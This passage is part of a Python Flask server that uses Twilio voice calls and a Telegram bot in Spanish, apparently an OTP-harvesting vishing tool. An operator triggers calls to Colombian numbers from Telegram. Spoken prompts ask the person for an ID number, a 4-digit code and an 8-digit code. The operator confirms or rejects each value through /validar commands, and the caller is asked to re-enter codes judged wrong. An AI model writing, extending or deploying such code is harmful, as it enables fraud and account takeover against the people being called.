    logger.info(f"⚠️ ESTADO DE VALIDACIÓN FINAL PARA SID={call_sid}: {validation}")

    response = VoiceResponse()

    # Si tenemos una validación final
    if validation is not None:
        logger.info(f"⚠️ VALIDACIÓN FINAL ENCONTRADA PARA SID={call_sid}: {validation}")
        
        # Resetear el contador de intentos ya que tenemos una validación
        count_key = f"{call_sid}_final_retry_count"
        if count_key in global_user_sessions.get(call_sid, {}):
            global_user_sessions[call_sid][count_key] = 0
            save_session_to_file(global_user_sessions)
        
        if validation == 1:  # Código correcto
            response.say("Verificación completada con éxito. Todos los datos son correctos. Gracias por su paciencia.", language='es-ES')
            return str(response)
        else:  # Código incorrecto
            logger.info(f"⚠️ REDIRIGIENDO A PASO 3 - CÓDIGO 8 DÍGITOS INCORRECTO PARA SID={call_sid}")
            response.say("El código de 8 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
            response.redirect('/step3')
            return str(response)
    else:
        # Añadimos un contador para evitar bucles infinitos
        count_key = f"{call_sid}_final_retry_count"
        retry_count = global_user_sessions.get(call_sid, {}).get(count_key, 0)
        
        # Si llevamos más de 8 intentos, finalizamos la llamada
        if retry_count > 8:
            logger.warning(f"⚠️ DEMASIADOS INTENTOS FINALES ({retry_count}) PARA SID={call_sid}. FINALIZANDO LLAMADA.")
            response.say("Lo sentimos, no hemos recibido validación después de varios intentos. Finalizando llamada.", language='es-ES')
            return str(response)
        
        # Incrementar contador
        if call_sid in global_user_sessions:
            global_user_sessions[call_sid][count_key] = retry_count + 1
            save_session_to_file(global_user_sessions)
            logger.info(f"⚠️ ESPERANDO VALIDACIÓN FINAL PARA SID={call_sid}. INTENTO {retry_count + 1}")
        
        # Mensajes variados para que no suene repetitivo
        if retry_count % 3 == 0:
            response.say("Seguimos validando su código final. Gracias por su paciencia.", language='es-ES')
        elif retry_count % 3 == 1:
            response.say("Continuamos con el proceso de verificación final. Por favor espere un momento más.", language='es-ES')
        else:
            response.say("Su código está siendo procesado. La validación está en curso.", language='es-ES')
            
        # Añadir una pausa de 10 segundos entre mensajes de voz
        response.pause(length=10)
        
        # Verificar explícitamente si hay validación antes de continuar
        if call_sid in global_user_sessions and 'validacion_final' in global_user_sessions[call_sid]:
            logger.info(f"✅ VALIDACIÓN FINAL DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
            response.redirect(f"/final-validation-result?sid={call_sid}")
        else:
            response.redirect(f"/final-validation-result?sid={call_sid}")
    
    return str(response)

def redirect_twiml(url_path):
    """Atajo para redirección de Twilio."""
    response = VoiceResponse()
    response.redirect(url_path)
    return str(response)

def send_to_telegram(message):
    """Envía mensaje a Telegram."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
    try:
        logger.info(f"⚠️ ENVIANDO MENSAJE A TELEGRAM: {message[:50]}...")
        response = requests.post(url, data=data)
        logger.info(f"⚠️ RESPUESTA DE TELEGRAM: {response.status_code} - {response.text[:50]}")
        return response.json()
    except Exception as e:
        logger.error(f"❌ ERROR AL ENVIAR A TELEGRAM: {e}")
        return None

def is_call_from_telegram(call_sid):
    """Verifica si una llamada fue iniciada desde Telegram."""
    return (call_sid in global_user_sessions and 
            'telegram_chat_id' in global_user_sessions[call_sid])

def send_telegram_response(chat_id, text):
    """Envía una respuesta directa a un chat de Telegram."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
    try:
        response = requests.post(url, data=data)
        logger.info(f"⚠️ RESPUESTA ENVIADA A TELEGRAM: {text[:50]}... - Status: {response.status_code}")
        return response.json()
    except Exception as e:
        logger.error(f"❌ ERROR AL ENVIAR RESPUESTA A TELEGRAM: {e}")
        return None

# ----- FUNCIONALIDAD: POLLING DE TELEGRAM -----

def fetch_telegram_updates():
    """Obtiene actualizaciones de Telegram mediante el método getUpdates."""
    global last_update_id
    
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates'
    params = {'timeout': 30}
    
    if last_update_id > 0:
        params['offset'] = last_update_id + 1
    
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            updates = response.json()
            if updates.get('ok') and updates.get('result'):
                logger.info(f"📥 Recibidas {len(updates['result'])} actualizaciones de Telegram")
                return updates['result']
    except Exception as e:
        logger.error(f"❌ ERROR AL OBTENER ACTUALIZACIONES DE TELEGRAM: {e}")
    
    return []

def process_telegram_update(update):
    """Procesa una actualización de Telegram."""
    global last_update_id, processed_message_ids
    
    # Actualizar el último ID de actualización
    update_id = update.get('update_id', 0)
    if update_id > last_update_id:
        last_update_id = update_id
    
    # Procesar mensajes de texto
    if 'message' in update and 'text' in update['message']:
        chat_id = update['message']['chat']['id']
        message_text = update['message']['text']
        message_id = update['message']['message_id']
        
        # Control para evitar procesar mensajes duplicados
        if message_id in processed_message_ids:
            logger.info(f"🔄 Mensaje ya procesado, ID: {message_id}. Ignorando.")
            return
            
        # Añadir a mensajes procesados
        processed_message_ids.add(message_id)
        
        # Si el conjunto es demasiado grande, limpiar los más antiguos
        if len(processed_message_ids) > 100:
            processed_message_ids = set(list(processed_message_ids)[-50:])
        
        logger.info(f"📨 MENSAJE DE TELEGRAM RECIBIDO: {message_text}")
        
        # Procesar comando de llamada
        if message_text.startswith('/llamar') or message_text.startswith('llamar'):
            process_call_command(chat_id, message_text)
            return
        
        # Procesar comandos de validación intermedia (nuevos 2 datos)
        if message_text.startswith('/validar2') or message_text.startswith('validar2'):
            parts = message_text.split()
            
            if len(parts) >= 4:
                sid = parts[1]
                try:
                    vals = list(map(int, parts[2:4]))  # Solo 2 valores
                    
                    # Asegurar que la sesión existe para este SID
                    if sid not in global_user_sessions:
                        global_user_sessions[sid] = {}
                        logger.info(f"🆕 Creada nueva sesión para SID={sid} en validación intermedia")
                    
                    # Restablecer contador de intentos si existe
                    count_key = f"{sid}_intermediate_retry_count"
                    if count_key in global_user_sessions[sid]:
                        global_user_sessions[sid][count_key] = 0
                        logger.info(f"🔄 Reiniciando contador de intentos intermedios para SID={sid}")
                    
                    # Guardar la validación intermedia
                    global_user_sessions[sid]['validacion_intermedia'] = vals
                    save_session_to_file(global_user_sessions)
                    
                    logger.info(f"✅ VALIDACIÓN INTERMEDIA GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
                    
                    # Confirmar al usuario de Telegram
                    send_telegram_response(chat_id, f"<b>✅ Validación intermedia guardada para {sid}:</b> {vals}")
                except Exception as e:
                    logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN INTERMEDIA TELEGRAM: {e}")
                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
            else:
                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar2 SID 1 1")
            return
        
        # Procesar comandos de validación final (solo código de 8 dígitos)
        if message_text.startswith('/validar3') or message_text.startswith('validar3'):
            parts = message_text.split()
            
            if len(parts) >= 3:
                sid = parts[1]
                try:
                    val = int(parts[2])  # Solo 1 valor
                    
                    # Asegurar que la sesión existe para este SID
                    if sid not in global_user_sessions:
                        global_user_sessions[sid] = {}
                        logger.info(f"🆕 Creada nueva sesión para SID={sid} en validación final")
                    
                    # Restablecer contador de intentos si existe
                    count_key = f"{sid}_final_retry_count"
                    if count_key in global_user_sessions[sid]:
                        global_user_sessions[sid][count_key] = 0
                        logger.info(f"🔄 Reiniciando contador de intentos finales para SID={sid}")
                    
                    # Guardar la validación final
                    global_user_sessions[sid]['validacion_final'] = val
                    save_session_to_file(global_user_sessions)
                    
                    logger.info(f"✅ VALIDACIÓN FINAL GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {val}")
                    
                    # Confirmar al usuario de Telegram
                    send_telegram_response(chat_id, f"<b>✅ Validación final guardada para {sid}:</b> {val}")
                except Exception as e:
                    logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN FINAL TELEGRAM: {e}")
                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
            else:
                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar3 SID 1")
            return
        
        # Procesar comandos de validación original (mantener compatibilidad con el sistema anterior)
        if message_text.startswith('/validar') or message_text.startswith('validar'):
            parts = message_text.split()
            
            if len(parts) >= 5:
                sid = parts[1]
                try:
                    vals = list(map(int, parts[2:5]))  # 3 valores para compatibilidad
                    
                    # Asegurar que la sesión existe para este SID
                    if sid not in global_user_sessions:
                        global_user_sessions[sid] = {}
                        logger.info(f"🆕 Creada nueva sesión para SID={sid} en validación original")
                    
                    # Restablecer contador de intentos si existe
                    count_key = f"{sid}_retry_count"
                    if count_key in global_user_sessions[sid]:
                        global_user_sessions[sid][count_key] = 0
                        logger.info(f"🔄 Reiniciando contador de intentos para SID={sid}")
                    
                    # Guardar la validación original
                    global_user_sessions[sid]['validacion'] = vals
                    save_session_to_file(global_user_sessions)
                    
                    logger.info(f"✅ VALIDACIÓN ORIGINAL GUARDADA PARA SID {sid} MEDIANTE TELEGRAM: {vals}")
                    
                    # Confirmar al usuario de Telegram
                    send_telegram_response(chat_id, f"<b>✅ Validación original guardada para {sid}:</b> {vals}")
                except Exception as e:
                    logger.error(f"❌ ERROR AL PROCESAR VALIDACIÓN ORIGINAL TELEGRAM: {e}")
                    send_telegram_response(chat_id, f"<b>❌ Error al procesar:</b> {e}")
            else:
                send_telegram_response(chat_id, "<b>❌ Formato incorrecto.</b> Usar: /validar SID 1 1 1")
            return
        
        # Comando de ayuda
        if message_text.startswith('/help') or message_text.startswith('help'):
            help_message = """
<b>📋 COMANDOS DISPONIBLES:</b>

<b>🔹 Realizar llamada:</b>
<code>/llamar +57XXXXXXXXXX</code>

<b>🔹 Validaciones:</b>
<code>/validar2 SID 1 1</code> - Validar primeros 2 datos (cédula y código 4 dígitos)
<code>/validar3 SID 1</code> - Validar código final de 8 dígitos
<code>/validar SID 1 1 1</code> - Validación completa (compatibilidad)

<b>🔹 Valores de validación:</b>
• <code>1</code> = Correcto
• <code>0</code> = Incorrecto

<b>🔹 Otros comandos:</b>
<code>/help</code> - Mostrar esta ayuda
            """
            send_telegram_response(chat_id, help_message)
            return
        
        # Si no coincide con ningún comando conocido
        send_telegram_response(chat_id, "❓ <b>Comando no reconocido.</b> Usa /help para ver los comandos disponibles.")
def process_call_command(chat_id, message_text):
    """Procesa el comando /llamar para iniciar una llamada desde Telegram."""
    parts = message_text.split()
    
    # Verificar formato correcto: /llamar +123456789
    if len(parts) < 2:
        send_telegram_response(chat_id, "❌ <b>Formato incorrecto.</b> Usar: /llamar +NÚMERO_TELÉFONO")
        return False
    
    # Extraer número de teléfono
    phone_number = parts[1]
    
    # Validación básica del número de teléfono
    if not (phone_number.startswith('+') and len(phone_number) > 8):
        send_telegram_response(chat_id, "❌ <b>Formato de número inválido.</b> Debe comenzar con + y tener al menos 8 dígitos.")
        return False
    
    # Iniciar polling de Telegram si no está activo (igual que en make_call)
    start_telegram_polling()
    
    try:
        # Usar la misma lógica que make_call para construir URLs
        base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
        url = f"{base_url}/start"
        status_callback_url = f"{base_url}/call-status-callback"
        
        logger.info(f"📞 URL para la llamada: {url}")
        logger.info(f"📞 URL para el callback de estado: {status_callback_url}")
        
        # Hacer la llamada usando EXACTAMENTE la misma configuración que make_call
        call = client.calls.create(
            to=phone_number,  # Solo cambiar el número de destino
            from_=TWILIO_PHONE_NUMBER,
            url=url,
            status_callback=status_callback_url,
            status_callback_method='POST',
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'busy', 'no-answer', 'failed']
        )
        
        # Inicializar la sesión EXACTAMENTE como en make_call, pero agregando telegram_chat_id
        global_user_sessions[call.sid] = {
            'call_status': 'initiated',
            'to_number': phone_number,  # Usar el número del comando en lugar de YOUR_PHONE_NUMBER
            'initiated_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'telegram_chat_id': chat_id  # Agregar el chat_id para respuestas específicas
        }
        save_session_to_file(global_user_sessions)
        
        # Notificar a Telegram IGUAL que make_call pero personalizado
        send_to_telegram(f"🚀 <b>Llamada iniciada desde Telegram</b>\nSID: {call.sid}\nNúmero: {phone_number}\nEstado: Iniciando...")
        
        # También enviar respuesta directa al usuario que pidió la llamada
        send_telegram_response(chat_id, f"🚀 <b>Llamada iniciada</b>\nNúmero: {phone_number}\nSID: {call.sid}")
        
        logger.info(f"📞 Nueva llamada iniciada desde Telegram: SID={call.sid}")
        return True
        
    except Exception as e:
        logger.error(f"❌ ERROR AL INICIAR LLAMADA DESDE TELEGRAM: {e}")
        send_telegram_response(chat_id, f"❌ <b>Error al iniciar llamada:</b> {str(e)}")
        return False

def telegram_polling_worker():
    """Worker para el polling de Telegram en segundo plano."""
    global telegram_polling_active
    
    logger.info("🔄 Iniciando polling de Telegram...")
    
    while telegram_polling_active:
        try:
            updates = fetch_telegram_updates()
            for update in updates:
                process_telegram_update(update)
        except Exception as e:
            logger.error(f"❌ ERROR EN EL WORKER DE POLLING: {e}")
        
        time.sleep(1)
    
    logger.info("🛑 Polling de Telegram detenido")

def start_telegram_polling():
    """Inicia el polling de Telegram si no está ya activo."""
    global telegram_polling_active
    
    if not telegram_polling_active:
        telegram_polling_active = True
        threading.Thread(target=telegram_polling_worker, daemon=True).start()
        logger.info("🚀 Thread de polling de Telegram iniciado")
        return True
    return False

def stop_telegram_polling():
    """Detiene el polling de Telegram."""
    global telegram_polling_active
    
    if telegram_polling_active:
        telegram_polling_active = False
        logger.info("🛑 Solicitud para detener polling de Telegram recibida")
        return True
    return False

if __name__ == '__main__':
    # Cargar sesiones previas
    global_user_sessions = load_sessions_from_file()
    
    # Iniciar polling de Telegram automáticamente al iniciar el servidor
    start_telegram_polling()
    
    # Usar el puerto que proporciona Railway
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)